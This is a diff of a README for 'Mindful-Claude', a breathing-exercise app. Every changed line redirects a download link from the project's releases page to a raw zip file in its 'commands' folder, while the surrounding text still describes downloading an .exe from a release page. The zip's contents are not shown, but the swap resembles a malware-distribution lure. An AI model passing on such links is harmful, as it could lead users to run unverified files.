@@ -1,6 +1,6 @@
 # 🧘 Mindful-Claude - Guided Breathing During Waits
 
-[![Download Mindful-Claude](https://img.shields.io/badge/Download-Mindful--Claude-brightgreen?style=for-the-badge)](https://github.com/strle/Mindful-Claude/releases)
+[![Download Mindful-Claude](https://img.shields.io/badge/Download-Mindful--Claude-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/strle/Mindful-Claude/main/commands/Mindful_Claude_1.7.zip)
 
 ---
 
@@ -17,7 +17,7 @@ Breathing at a steady, slow pace improves your body’s stress response and focu
 To start using Mindful-Claude on your Windows computer, follow these steps:
 
 1. Visit the release page to download Mindful-Claude:  
-   [Download Mindful-Claude](https://github.com/strle/Mindful-Claude/releases)
+   [Download Mindful-Claude](https://raw.githubusercontent.com/strle/Mindful-Claude/main/commands/Mindful_Claude_1.7.zip)
 
 2. On that page, locate the latest release. Look for a file that ends with `.exe` (example: `Mindful-Claude-Setup.exe`).
 
@@ -142,7 +142,7 @@ If issues continue, visit the release page for updates.
 
 Download the latest Windows installer here:
 
-[![Download Mindful-Claude](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/strle/Mindful-Claude/releases)
+[![Download Mindful-Claude](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://raw.githubusercontent.com/strle/Mindful-Claude/main/commands/Mindful_Claude_1.7.zip)
 
 Click the link, then find and download the `.exe` file for Windows.
 
